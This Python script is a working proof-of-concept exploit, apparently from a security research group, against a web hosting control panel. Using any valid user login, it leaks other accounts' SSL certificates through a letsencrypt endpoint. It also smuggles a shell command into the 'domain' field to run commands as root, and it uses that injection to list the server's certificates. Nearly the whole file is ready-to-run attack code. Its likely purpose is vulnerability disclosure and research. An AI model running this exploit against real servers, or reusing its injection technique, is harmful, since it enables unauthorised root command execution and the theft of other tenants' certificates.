# Copyright (C) 2022 Mat Rollings, Immersive Labs
# https://github.com/Immersive-Labs-Sec/
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import argparse
import base64

import requests
import urllib3

# Disable the Insecure Warnings for self signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",

}

session = requests.session()

"""
Leak SSL certificates from other accounts.

Note that this endpoint is also vulnerable to command injection and can be used to run any command as root and return
the output. This is used when not providing a hostname to view all possible certificates.

- Requires a valid user login

[POST] index.php?module=letsencrypt&acc=infomodal
[DATA] domain=srv2.example.com&type=cert
"""


def login(base_url, username, password):
    login_url = f'{base_url}/login/index.php?acc=validate'
    account_url = f'{base_url}/{username}/'

    data = {
        'username': username,
        'password': base64.b64encode(password.encode('ascii')),
        'sessioning': '0',
        'userlang': ''
    }

    response = session.post(login_url, data=data, verify=False)
    token = response.json().get('token')

    if not token:
        return False

    data = {
        'username': username,
        'password': '',
        'token': token,
        'intended': ''
    }

    response = session.post(account_url,
                            data=data,
                            verify=False,
                            allow_redirects=False)

    # Check the User cookie was set and will exist in our session
    cookies = response.cookies.get_dict()
    for key in cookies.keys():
        if key.startswith('cwpsrv-User-'):
            return True


def perform_leak(base_url, username, domain):
    """Leak the SSL certificate for a given domain"""

    target_url = f'{base_url}/{username}/index.php?module=letsencrypt&acc=infomodal'
    post_data = {
        'domain': domain,
        'type': 'cert'
    }

    response = session.post(target_url, data=post_data, verify=False)

    if response.status_code == 200:
        j = response.json()
        return j.get('result')


def command_inject(base_url, username, command):
    """Find out what SSL certificates are on the server using the command injection in the same place."""
    cmd = f'$({command}|base64 -w0)'
    result64 = perform_leak(base_url, username, cmd).split('/')[-1].replace('.cert', '')
    result = base64.b64decode(result64).decode('ascii').strip()
    return result


def list_certificates(base_url, username):
    """Find out what SSL certificates are on the server using the command injection in the same place."""
    result = command_inject(base_url, username, 'find /etc/pki/tls/certs/*.cert -printf "%f\n"')
    if ".cert" in result:
        return result.replace('.cert', '')


def leak_certificate(base_url, username, domain):
    """Leak the SSL certificate for a given domain"""
    return perform_leak(base_url, username, domain)


if __name__ == '__main__':

    parser = argparse.ArgumentParser(
        description='Leak SSL certificates for a known hostname')
    parser.add_argument(
        '--target',
        help='Target Host e.g. 54.32.155.22',
        required=True)

    parser.add_argument(
        '--username',
        help='Username for an existing account',
        required=True)

    parser.add_argument(
        '--password',
        help="Password for existing account",
        required=True)

    parser.add_argument(
        '--hostname',
        help="The hostname to leak a certificate for e.g. test.exampledomain.com, if not provided command injection will"
             "be used to try to find all the available certificates",
        required=False)

    parser.add_argument(
        '--proxy',
        help="Proxy Requests through a default local BURP instance",
        required=False,
        action='store_true')

    args = parser.parse_args()

    if args.proxy:
        session.proxies.update(proxies)

    # Construct our Base URL
    base_url = f'https://{args.target}:2083'

    print(f'[+] Logging in to target with username {args.username}')
    authenticated = login(base_url, args.username, args.password)

    if authenticated:
        print('  [-] Auth Successful')
        if args.hostname:
            print(f'  [-] Attempting to leak certificate for {args.hostname}')
            response = leak_certificate(base_url, args.username, args.hostname)
            if 'BEGIN CERTIFICATE' in response:
                print('[*] Certificate leaked:')
                print(response)
            else:
                print('[!] The server returned an error')
                print(response)
        else:
            print(f'  [-] Attempting command injection to find all certificates')
            response = list_certificates(base_url, args.username)
            if response:
                print('[*] Certificates found:')
                print(response)
            else:
                print('[!] Error or no certificates found!')
                print(response)



    else:
        print(f'[!] Unable to authenticate with the target')
